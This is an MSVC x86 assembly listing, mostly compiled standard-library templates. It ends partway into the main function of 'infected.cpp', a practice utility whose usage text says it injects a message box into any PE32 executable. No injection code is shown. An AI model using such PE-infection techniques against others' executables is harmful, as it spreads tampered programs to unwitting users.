__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
_<_Args_0>$ = 16					; size = 2
??$_Reallocate_grow_by@V<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>,wchar_t>, COMDAT
; _this$ = ecx

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 28	 sub	 esp, 40			; 00000028H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR __My_data$[ebp], eax

; 4811 :         const size_type _Old_size = _My_data._Mysize;

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	8b 51 10	 mov	 edx, DWORD PTR [ecx+16]
  00015	89 55 f4	 mov	 DWORD PTR __Old_size$[ebp], edx

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  00018	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00020	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00023	3b 45 08	 cmp	 eax, DWORD PTR __Size_increase$[ebp]
  00026	73 05		 jae	 SHORT $LN2@Reallocate

; 4813 :             _Xlen_string(); // result too long

  00028	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;

  0002d	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00030	03 45 08	 add	 eax, DWORD PTR __Size_increase$[ebp]
  00033	89 45 ec	 mov	 DWORD PTR __New_size$[ebp], eax

; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  00036	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00039	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  0003c	89 55 e4	 mov	 DWORD PTR __Old_capacity$[ebp], edx

; 4818 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  0003f	8b 45 ec	 mov	 eax, DWORD PTR __New_size$[ebp]
  00042	50		 push	 eax
  00043	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00046	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABEII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  0004b	89 45 e8	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 4819 :         auto& _Al                     = _Getal();

  0004e	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00051	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00056	89 45 dc	 mov	 DWORD PTR __Al$[ebp], eax

; 4820 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00059	8d 4d e8	 lea	 ecx, DWORD PTR __New_capacity$[ebp]
  0005c	51		 push	 ecx
  0005d	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  00060	52		 push	 edx
  00061	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  00066	83 c4 08	 add	 esp, 8
  00069	89 45 f0	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 4821 : 
; 4822 :         _My_data._Orphan_all();

  0006c	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0006f	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

  00074	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00077	8b 4d ec	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0007a	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4825 :         _My_data._Myres       = _New_capacity;

  0007d	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00080	8b 45 e8	 mov	 eax, DWORD PTR __New_capacity$[ebp]
  00083	89 42 14	 mov	 DWORD PTR [edx+20], eax

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  00086	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00089	51		 push	 ecx
  0008a	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  0008f	83 c4 04	 add	 esp, 4
  00092	89 45 d8	 mov	 DWORD PTR __Raw_new$[ebp], eax

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00095	83 7d e4 07	 cmp	 DWORD PTR __Old_capacity$[ebp], 7
  00099	76 48		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  0009b	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0009e	8b 02		 mov	 eax, DWORD PTR [edx]
  000a0	89 45 e0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

  000a3	0f b7 4d 10	 movzx	 ecx, WORD PTR _<_Args_0>$[ebp]
  000a7	51		 push	 ecx
  000a8	8b 55 f4	 mov	 edx, DWORD PTR __Old_size$[ebp]
  000ab	52		 push	 edx
  000ac	8b 45 e0	 mov	 eax, DWORD PTR __Old_ptr$1[ebp]
  000af	50		 push	 eax
  000b0	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  000b5	83 c4 04	 add	 esp, 4
  000b8	50		 push	 eax
  000b9	8b 4d d8	 mov	 ecx, DWORD PTR __Raw_new$[ebp]
  000bc	51		 push	 ecx
  000bd	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000c0	e8 00 00 00 00	 call	 ??R<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@QBE@QA_WQB_WI_W@Z ; <lambda_38fb7828f6004e9a4c6a38bfc6df7f44>::operator()

; 4830 :             _Deallocate_for_capacity(_Al, _Old_ptr, _Old_capacity);

  000c5	8b 55 e4	 mov	 edx, DWORD PTR __Old_capacity$[ebp]
  000c8	52		 push	 edx
  000c9	8b 45 e0	 mov	 eax, DWORD PTR __Old_ptr$1[ebp]
  000cc	50		 push	 eax
  000cd	8b 4d dc	 mov	 ecx, DWORD PTR __Al$[ebp]
  000d0	51		 push	 ecx
  000d1	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAAV?$allocator@_W@2@QA_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
  000d6	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

  000d9	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  000dc	8b 45 f0	 mov	 eax, DWORD PTR __New_ptr$[ebp]
  000df	89 02		 mov	 DWORD PTR [edx], eax

; 4832 :         } else {

  000e1	eb 29		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

  000e3	0f b7 4d 10	 movzx	 ecx, WORD PTR _<_Args_0>$[ebp]
  000e7	51		 push	 ecx
  000e8	8b 55 f4	 mov	 edx, DWORD PTR __Old_size$[ebp]
  000eb	52		 push	 edx
  000ec	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  000ef	50		 push	 eax
  000f0	8b 4d d8	 mov	 ecx, DWORD PTR __Raw_new$[ebp]
  000f3	51		 push	 ecx
  000f4	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000f7	e8 00 00 00 00	 call	 ??R<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@QBE@QA_WQB_WI_W@Z ; <lambda_38fb7828f6004e9a4c6a38bfc6df7f44>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000fc	8d 55 f0	 lea	 edx, DWORD PTR __New_ptr$[ebp]
  000ff	52		 push	 edx
  00100	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00103	50		 push	 eax
  00104	e8 00 00 00 00	 call	 ??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
  00109	83 c4 08	 add	 esp, 8
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  0010c	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@Reallocate:

; 4839 :     }

  0010f	8b e5		 mov	 esp, ebp
  00111	5d		 pop	 ebp
  00112	c2 0c 00	 ret	 12			; 0000000cH
??$_Reallocate_grow_by@V<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV01@IV<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>,wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@QBE@QA_WQB_WI_W@Z
_TEXT	SEGMENT
_this$ = -8						; size = 4
$T1 = -2						; size = 2
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
__Ch$ = 20						; size = 2
??R<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@QBE@QA_WQB_WI_W@Z PROC ; <lambda_38fb7828f6004e9a4c6a38bfc6df7f44>::operator(), COMDAT
; _this$ = ecx

; 4099 :             },

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4096 :                 _Traits::copy(_New_ptr, _Old_ptr, _Old_size);

  00009	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00014	52		 push	 edx
  00015	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  0001a	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4097 :                 _Traits::assign(_New_ptr[_Old_size], _Ch);

  0001d	8d 45 14	 lea	 eax, DWORD PTR __Ch$[ebp]
  00020	50		 push	 eax
  00021	8b 4d 10	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  00024	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00027	8d 04 4a	 lea	 eax, DWORD PTR [edx+ecx*2]
  0002a	50		 push	 eax
  0002b	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00030	83 c4 08	 add	 esp, 8

; 4098 :                 _Traits::assign(_New_ptr[_Old_size + 1], _Elem());

  00033	33 c9		 xor	 ecx, ecx
  00035	66 89 4d fe	 mov	 WORD PTR $T1[ebp], cx
  00039	8d 55 fe	 lea	 edx, DWORD PTR $T1[ebp]
  0003c	52		 push	 edx
  0003d	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00040	8b 4d 08	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00043	8d 54 41 02	 lea	 edx, DWORD PTR [ecx+eax*2+2]
  00047	52		 push	 edx
  00048	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  0004d	83 c4 08	 add	 esp, 8

; 4099 :             },

  00050	8b e5		 mov	 esp, ebp
  00052	5d		 pop	 ebp
  00053	c2 10 00	 ret	 16			; 00000010H
??R<lambda_38fb7828f6004e9a4c6a38bfc6df7f44>@@QBE@QA_WQB_WI_W@Z ENDP ; <lambda_38fb7828f6004e9a4c6a38bfc6df7f44>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$min@I@std@@YAABIABI0@Z
_TEXT	SEGMENT
$T1 = -8						; size = 4
tv65 = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$min@I@std@@YAABIABI0@Z PROC				; std::min<unsigned int>, COMDAT

; 98   :     (min) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Right < _Left)) /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 99   :     // return smaller of _Left and _Right
; 100  :     return _Right < _Left ? _Right : _Left;

  00006	8b 45 0c	 mov	 eax, DWORD PTR __Right$[ebp]
  00009	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0000c	8b 10		 mov	 edx, DWORD PTR [eax]
  0000e	3b 11		 cmp	 edx, DWORD PTR [ecx]
  00010	73 08		 jae	 SHORT $LN3@min
  00012	8b 45 0c	 mov	 eax, DWORD PTR __Right$[ebp]
  00015	89 45 fc	 mov	 DWORD PTR tv65[ebp], eax
  00018	eb 06		 jmp	 SHORT $LN4@min
$LN3@min:
  0001a	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0001d	89 4d fc	 mov	 DWORD PTR tv65[ebp], ecx
$LN4@min:
  00020	8b 55 fc	 mov	 edx, DWORD PTR tv65[ebp]
  00023	89 55 f8	 mov	 DWORD PTR $T1[ebp], edx
  00026	8b 45 f8	 mov	 eax, DWORD PTR $T1[ebp]

; 101  : }

  00029	8b e5		 mov	 esp, ebp
  0002b	5d		 pop	 ebp
  0002c	c3		 ret	 0
??$min@I@std@@YAABIABI0@Z ENDP				; std::min<unsigned int>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$max@I@std@@YAABIABI0@Z
_TEXT	SEGMENT
$T1 = -8						; size = 4
tv65 = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$max@I@std@@YAABIABI0@Z PROC				; std::max<unsigned int>, COMDAT

; 75   :     (max) (const _Ty& _Left, const _Ty& _Right) noexcept(noexcept(_Left < _Right)) /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 76   :     // return larger of _Left and _Right
; 77   :     return _Left < _Right ? _Right : _Left;

  00006	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00009	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  0000c	8b 10		 mov	 edx, DWORD PTR [eax]
  0000e	3b 11		 cmp	 edx, DWORD PTR [ecx]
  00010	73 08		 jae	 SHORT $LN3@max
  00012	8b 45 0c	 mov	 eax, DWORD PTR __Right$[ebp]
  00015	89 45 fc	 mov	 DWORD PTR tv65[ebp], eax
  00018	eb 06		 jmp	 SHORT $LN4@max
$LN3@max:
  0001a	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0001d	89 4d fc	 mov	 DWORD PTR tv65[ebp], ecx
$LN4@max:
  00020	8b 55 fc	 mov	 edx, DWORD PTR tv65[ebp]
  00023	89 55 f8	 mov	 DWORD PTR $T1[ebp], edx
  00026	8b 45 f8	 mov	 eax, DWORD PTR $T1[ebp]

; 78   : }

  00029	8b e5		 mov	 esp, ebp
  0002b	5d		 pop	 ebp
  0002c	c3		 ret	 0
??$max@I@std@@YAABIABI0@Z ENDP				; std::max<unsigned int>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AAV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AAV10@@Z PROC ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1584 :     return __builtin_addressof(_Val);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 1585 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AAV10@@Z ENDP ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$_Copy_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Other$ = 8						; size = 4
??$_Copy_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@1@@Z PROC ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Copy_construct_from<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 1316 :     void _Copy_construct_from(const shared_ptr<_Ty2>& _Other) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1317 :         // implement shared_ptr's (converting) copy ctor
; 1318 :         _Other._Incref();

  00007	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Incref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEXXZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Incref

; 1319 : 
; 1320 :         _Ptr = _Other._Ptr;

  0000f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00012	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  00015	8b 11		 mov	 edx, DWORD PTR [ecx]
  00017	89 10		 mov	 DWORD PTR [eax], edx

; 1321 :         _Rep = _Other._Rep;

  00019	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001c	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  0001f	8b 51 04	 mov	 edx, DWORD PTR [ecx+4]
  00022	89 50 04	 mov	 DWORD PTR [eax+4], edx

; 1322 :     }

  00025	8b e5		 mov	 esp, ebp
  00027	5d		 pop	 ebp
  00028	c2 04 00	 ret	 4
??$_Copy_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@1@@Z ENDP ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Copy_construct_from<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$_Move_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEX$$QAV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??$_Move_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEX$$QAV01@@Z PROC ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Move_construct_from<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 1306 :     void _Move_construct_from(_Ptr_base<_Ty2>&& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1307 :         // implement shared_ptr's (converting) move ctor and weak_ptr's move ctor
; 1308 :         _Ptr = _Right._Ptr;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  0000d	8b 11		 mov	 edx, DWORD PTR [ecx]
  0000f	89 10		 mov	 DWORD PTR [eax], edx

; 1309 :         _Rep = _Right._Rep;

  00011	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00014	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00017	8b 51 04	 mov	 edx, DWORD PTR [ecx+4]
  0001a	89 50 04	 mov	 DWORD PTR [eax+4], edx

; 1310 : 
; 1311 :         _Right._Ptr = nullptr;

  0001d	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00020	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], 0

; 1312 :         _Right._Rep = nullptr;

  00026	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00029	c7 41 04 00 00
	00 00		 mov	 DWORD PTR [ecx+4], 0

; 1313 :     }

  00030	8b e5		 mov	 esp, ebp
  00032	5d		 pop	 ebp
  00033	c2 04 00	 ret	 4
??$_Move_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEX$$QAV01@@Z ENDP ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Move_construct_from<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@@std@@YA$$QAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@@std@@YA$$QAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@AAV10@@Z PROC ; std::move<std::shared_ptr<std::filesystem::_Dir_enum_impl> &>, COMDAT

; 1571 : _NODISCARD _MSVC_INTRINSIC constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1573 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$move@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@@std@@YA$$QAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@AAV10@@Z ENDP ; std::move<std::shared_ptr<std::filesystem::_Dir_enum_impl> &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\masm32\Code\ASMPractice\demo1\demo3\infected.cpp
_TEXT	SEGMENT
tv240 = -64						; size = 4
tv221 = -60						; size = 4
tv202 = -56						; size = 4
tv175 = -52						; size = 4
tv168 = -48						; size = 4
tv161 = -44						; size = 4
tv154 = -40						; size = 4
tv147 = -36						; size = 4
tv140 = -32						; size = 4
tv135 = -28						; size = 4
tv95 = -24						; size = 4
tv129 = -20						; size = 4
tv84 = -16						; size = 4
tv76 = -12						; size = 4
tv78 = -8						; size = 4
_doRecover$ = -1					; size = 1
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC

; 496  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H

; 497  : 
; 498  :     if (argc < 2)

  00006	83 7d 08 02	 cmp	 DWORD PTR _argc$[ebp], 2
  0000a	0f 8d 6c 01 00
	00		 jge	 $LN2@main

; 499  :     {
; 500  :         cout << "\t" << argv[0] << ": A simple utility for indecting Message Box into any PE32 EXE file" << endl;

  00010	68 00 00 00 00	 push	 OFFSET $SG148234
  00015	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  0001a	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  0001f	83 c4 08	 add	 esp, 8
  00022	89 45 f4	 mov	 DWORD PTR tv76[ebp], eax
  00025	b8 04 00 00 00	 mov	 eax, 4
  0002a	6b c8 00	 imul	 ecx, eax, 0
  0002d	8b 55 0c	 mov	 edx, DWORD PTR _argv$[ebp]
  00030	8b 04 0a	 mov	 eax, DWORD PTR [edx+ecx]
  00033	89 45 f8	 mov	 DWORD PTR tv78[ebp], eax
  00036	8b 4d f8	 mov	 ecx, DWORD PTR tv78[ebp]
  00039	51		 push	 ecx
  0003a	8b 55 f4	 mov	 edx, DWORD PTR tv76[ebp]
  0003d	52		 push	 edx
  0003e	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00043	83 c4 08	 add	 esp, 8
  00046	68 00 00 00 00	 push	 OFFSET $SG148233
  0004b	50		 push	 eax
  0004c	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00051	83 c4 08	 add	 esp, 8
  00054	89 45 f0	 mov	 DWORD PTR tv84[ebp], eax
  00057	68 00 00 00 00	 push	 OFFSET ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ; std::endl<char,std::char_traits<char> >
  0005c	8b 4d f0	 mov	 ecx, DWORD PTR tv84[ebp]
  0005f	e8 00 00 00 00	 call	 ??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z ; std::basic_ostream<char,std::char_traits<char> >::operator<<

; 501  :         cout << "\tExample:	" << argv[0] << " -f <file.exe> -r" << endl

  00064	68 00 00 00 00	 push	 OFFSET $SG148236
  00069	68 00 00 00 00	 push	 OFFSET ?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A ; std::cout
  0006e	e8 00 00 00 00	 call	 ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ; std::operator<<<std::char_traits<char> >
  00073	83 c4 08	 add	 esp, 8
  00076	89 45 e8	 mov	 DWORD PTR tv95[ebp], eax
  00079	b8 04 00 00 00	 mov	 eax, 4
  0007e	6b c8 00	 imul	 ecx, eax, 0
  00081	8b 55 0c	 mov	 edx, DWORD PTR _argv$[ebp]
